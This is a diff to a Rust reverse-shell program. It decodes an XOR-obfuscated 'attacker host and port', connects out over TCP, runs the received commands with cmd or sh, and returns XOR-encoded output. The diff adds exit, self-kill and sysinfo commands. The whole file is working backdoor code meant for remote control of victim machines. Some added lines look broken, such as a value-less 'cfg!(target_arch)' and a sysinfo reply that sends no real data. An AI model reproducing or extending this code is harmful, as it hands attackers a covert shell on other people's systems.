@@ -6,6 +6,10 @@ use std::thread;
 use std::time::Duration;
 
 fn int_xor(clear_text: &str, key: u8) -> String {
+	/*
+		A simple xor encryption function to encrypt string and traffic
+		Key is a unsigned int key
+	*/
 	let mut enc_text = "".to_string();
 	for chr in clear_text.chars() {
 		if chr.to_string() == "\n" {
@@ -19,8 +23,13 @@ fn int_xor(clear_text: &str, key: u8) -> String {
 	return enc_text;
 }
 
+fn system_info() {
+	println!("{}", cfg!(target_arch));
+}
+
 fn main() {
 	let key: u8 = 16;
+	let mut flag: u8 = 0;
 	let addr = &*int_xor("!\"\'> > >!*((((", key); // Attacker host and port. EDIT here
 	loop {
 		match TcpStream::connect(addr) {
@@ -36,26 +45,47 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
-							//							command = &*int_xor(command, key);
 							let cmd = &*int_xor(command, key);
-							//							command = tmp;
-							if cmd == "exit\n" {
-								break;
-							} else if cmd == "killself\n" {
-								return;
-							} else {
-								let output = if cfg!(target_os = "windows") {
+							// TODO handle string here: python don't have "\n" while nc have
+							if cmd == "exit"
+							{
+								flag = 1;
+							}
+							else if cmd == "killself"
+							{
+								flag = 2;
+							}
+							else if cmd == "sysinfo"
+							{
+								system_info();
+								conn.write(
+									int_xor("System info" as &str, key).as_bytes()
+								).unwrap();
+							}
+							else
+							{
+								let output = if cfg!(target_os = "windows")
+								{
 									Command::new("cmd").args(&["/C", cmd]).output().unwrap()
-								} else {
+								}
+								else
+								{
 									Command::new("sh").arg("-c").arg(cmd).output().unwrap()
 								};
 								conn.write(
 									int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes(),
-								)
-									 .unwrap();
+								).unwrap();
 							}
 						}
 						Err(_) => {}
+					}
+					if flag == 1
+					{
+						break;
+					}
+					else if flag == 2
+					{
+						return;
 					}
 				}
 			}
